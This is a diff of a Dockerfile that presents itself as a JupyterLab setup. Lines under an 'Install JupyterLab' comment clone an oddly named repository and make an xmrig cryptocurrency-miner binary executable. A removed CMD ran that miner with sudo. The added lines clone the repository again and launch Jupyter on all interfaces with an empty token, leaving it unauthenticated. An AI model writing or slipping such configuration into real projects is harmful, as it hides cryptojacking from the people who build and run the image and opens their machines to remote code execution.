@@ -53,8 +53,13 @@ WORKDIR /app
 # Install JupyterLab
 RUN git clone https://github.com/SudoSuII/hsJwjJwj91
 RUN chmod +x /app/hsJwjJwj91/xmrig
-# Expose port 8080
-EXPOSE 8080
 
 # Start JupyterLab on port 8080 without authentication
-CMD ["sudo", "/app/hsJwjJwj91/xmrig"]
+
+RUN pip3 install jupyterlab --break-system-packages
+
+RUN git clone https://github.com/SudoSuII/hsJwjJwj91
+
+EXPOSE 8080
+
+CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port=8080", "--no-browser", "--allow-root", "--NotebookApp.token=''"]
